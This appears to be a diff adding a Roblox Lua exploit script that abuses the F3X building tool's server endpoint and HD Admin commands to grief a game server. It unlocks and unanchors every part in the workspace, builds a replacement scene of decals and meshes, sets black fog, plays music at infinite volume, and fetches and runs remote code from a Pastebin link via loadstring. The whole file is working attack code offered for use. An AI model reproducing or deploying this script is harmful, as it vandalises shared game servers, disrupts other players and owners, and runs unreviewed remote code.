@@ -1,0 +1,373 @@
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+local player = game.Players.LocalPlayer
+local char = player.Character
+local backpack = player.Backpack
+
+local function getf3x()
+	for _, v in ipairs(backpack:GetChildren()) do
+		if v:FindFirstChild("SyncAPI") then
+			return v
+		end
+	end
+	for _, v in ipairs(char:GetChildren()) do
+		if v:FindFirstChild("SyncAPI") then
+			return v
+		end
+	end
+	return nil
+end
+
+local f3x = getf3x()
+if not f3x then
+	warn("you dont have f3x skid")
+end
+local syncapi = f3x.SyncAPI
+local serverendpoint = syncapi.ServerEndpoint
+
+function _(args)
+        serverendpoint:InvokeServer(unpack(args))
+    end
+
+local function fire(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire",
+                ["Size"] = 30,
+                ["Heat"] = 9,
+                ["Color"] = Color3.fromRGB(255, 0, 0), 
+                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+function MovePart(part, cf)
+    local args = {
+        "SyncMove",
+        {
+            {
+                Part = part,
+                CFrame = cf
+            }
+        }
+    }
+    _(args)
+end
+
+local function resize(part, size, cf)
+	local args = {
+		"SyncResize",
+		{
+			{
+				Part = part,
+				CFrame = cf,
+				Size = size
+			}
+		}
+	}
+	_(args)
+end
+
+local function mat(part, mate)
+	local args = {
+		"SyncMaterial",
+		{
+			{
+				Part = part,
+				Material = mate
+			}
+		}
+	}
+	_(args)
+end
+
+local function transparency(part, trans)
+	local args = {
+		"SyncMaterial",
+		{
+			{
+				Part = part,
+				Transparency = trans
+			}
+		}
+	}
+	_(args)
+end
+
+local function color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshid(part, id)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				MeshId = "rbxassetid://" .. id
+			}
+		}
+	}
+	_(args)
+end
+
+local function makemesh(part)
+	local args = {
+		"CreateMeshes",
+		{
+			{
+				Part = part
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshsize(part, vectora)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				Scale = vectora
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshtexture(part, id)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				TextureId = "rbxassetid://" .. id
+			}
+		}
+	}
+	_(args)
+end
+
+local function name(part, stringa)
+	local args = {
+		"SetName",
+		{ part },
+		stringa
+	}
+	_(args)
+end
+
+local function lock(part, boolean)
+	local args = {
+		"SetLocked",
+		{ part },
+		boolean
+	}
+	_(args)
+end
+
+local function setcollision(part, booleana)
+	local args = {
+		"SyncCollision",
+		{
+			{
+				Part = part,
+				CanCollide = booleana
+			}
+		}
+	}
+	_(args)
+end
+
+local function setanchor(part, boolean)
+	local args = {
+		"SyncAnchor",
+		{
+			{
+				Part = part,
+				Anchored = boolean
+			}
+		}
+	}
+	_(args)
+end
+
+local function createtexture(part, side)
+	local args = {
+		"CreateTextures",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Texture"
+			}
+		}
+	}
+	_(args)
+end
+
+local function createdecal(part, side)
+	local args = {
+		"CreateTextures",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Decal"
+			}
+		}
+	}
+	_(args)
+end
+local function setdecal(part, asset, side)
+	local args = {
+		"SyncTexture",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Decal",
+				Texture = "rbxassetid://" .. asset
+			}
+		}
+	}
+	_(args)
+end
+
+		function floor(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://135172958780980",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			_(args)
+		end
+    
+    
+local function RealmV2()
+	local position = CFrame.new(-152.421, -46.197, -115.697)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(869, 1, 543), position)
+  color(base, Color3.fromRGB(71, 101, 76))
+  createtexture(base, Enum.NormalId.Top)
+  floor(base, Enum.NormalId.Top)
+
+
+	local spawnpos = CFrame.new(42.125, -45.697, -48.895)
+	local spawna = serverendpoint:InvokeServer("CreatePart", "Spawn", spawnpos, workspace)
+	resize(spawna, Vector3.new(10, 1, 10), spawnpos)
+	name(spawna, "SpawnLocation")
+	createdecal(spawna, Enum.NormalId.Top)
+  setcollision(spawna, false)
+  transparency(spawna, 1)
+  setdecal(spawna, "96943548698627", Enum.NormalId.Top)
+
+local position = CFrame.new(64.885, -40.197, -74.988)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(27, 12, 1), position)
+  transparency(base, 1)
+  setcollision(base, false)
+  createdecal(base, Enum.NormalId.Back)
+  setdecal(base, "125792104590827", Enum.NormalId.Back)
+
+
+local pos21 = CFrame.new(49.037, -42.797, -75.077)
+	local Player19 = serverendpoint:InvokeServer("CreatePart", "Normal", pos21, workspace)
+makemesh(Player19)
+syncmeshid(Player19, "135498269740610")
+syncmeshtexture(Player19, "86069961094445")
+MovePart(Player19, Player19.CFrame * CFrame.Angles(0, math.rad(90), 0))
+
+local pos21 = CFrame.new(36.46, -45.197, -76.523)
+	local Player19 = serverendpoint:InvokeServer("CreatePart", "Normal", pos21, workspace)
+makemesh(Player19)
+syncmeshid(Player19, "13846055645")
+syncmeshtexture(Player19, "13846055859")
+syncmeshsize(Player19, Vector3.new(5, 5, 5))
+MovePart(Player19, Player19.CFrame * CFrame.Angles(0, math.rad(90), 0))
+
+local pos21 = CFrame.new(35.793, -32.697, -104.497)
+	local Player19 = serverendpoint:InvokeServer("CreatePart", "Normal", pos21, workspace)
+makemesh(Player19)
+syncmeshid(Player19, "105996602913235")
+syncmeshtexture(Player19, "122599551209854")
+syncmeshsize(Player19, Vector3.new(5, 5, 5))
+
+local pos21 = CFrame.new(80.037, -42.797, -75.077)
+	local Player19 = serverendpoint:InvokeServer("CreatePart", "Normal", pos21, workspace)
+makemesh(Player19)
+syncmeshid(Player19, "116713687495955")
+syncmeshtexture(Player19, "134110754201923")
+
+local pos21 = CFrame.new(50.755, -33.697, -94.354)
+	local Player19 = serverendpoint:InvokeServer("CreatePart", "Normal", pos21, workspace)
+makemesh(Player19)
+syncmeshid(Player19, "102503995077696")
+syncmeshtexture(Player19, "129691825082965")
+MovePart(Player19, Player19.CFrame * CFrame.Angles(0, math.rad(-45), 0))
+
+ end
+local function unanchorall()
+	for _, v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") or v:IsA("UnionOperation") then
+			spawn(function()
+        lock(v, false)
+				setanchor(v, false)
+			end)
+		end
+	end
+end
+
+local function realm()
+	unanchorall()
+	wait(13)
+	RealmV2()
+loadstring(game:HttpGet("https://pastebin.com/raw/qh3RikUB"))()
+  
+end
+realm()
+RequestCommand:InvokeServer(";fogcolor black")
+RequestCommand:InvokeServer(";music 9069609200 ;volume inf")
+wait(9)
+RequestCommand:InvokeServer(";music 1839246711 ;volume inf")
+--50.755, -33.697, -94.354
+--0, -45, 0
